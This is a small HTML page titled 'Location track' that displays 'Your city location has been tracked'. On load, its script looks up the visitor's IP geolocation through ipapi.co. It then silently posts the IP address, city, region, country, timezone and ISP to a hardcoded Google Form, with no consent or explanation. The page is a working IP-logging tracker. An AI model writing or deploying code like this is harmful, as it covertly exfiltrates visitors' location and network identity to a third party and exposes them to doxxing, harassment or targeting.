<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title> Location track </title>
	<style type="text/css" media="all">
		body {
			background: #010041;
			color: #ff7810;
			font-family: Arial;
		}
		p {
			text-align: center;
			font-size: 22px;
			font-weight: 900;
			margin: 20px 0;
		}
	</style>
</head>
<body>
	<p> Your city location has been tracked </p>


	 <script>
fetch('https://ipapi.co/json/')
  .then(res => res.json())
  .then(data => {

    const formURL =
      'https://docs.google.com/forms/d/e/1FAIpQLSdKNMmvNkPL2QsORsvOiaMn3jVBZfqFWsCt1iYf6QHX7_lJiQ/formResponse';

    const formData = new FormData();
    formData.append('entry.350679769', data.ip);                 // IP
    formData.append('entry.1318643907', data.city);             // City
    formData.append('entry.327442812', data.region);            // Region
    formData.append('entry.1961775', data.country_name);        // Country
    formData.append('entry.1519889978', data.timezone);         // Timezone
    formData.append('entry.2142148047', data.org);              // ISP

    fetch(formURL, {
      method: 'POST',
      body: formData,
      mode: 'no-cors'
    });

  })
  .catch(err => console.error('Visitor tracking error:', err));
	 </script>
	
</body>
</html>
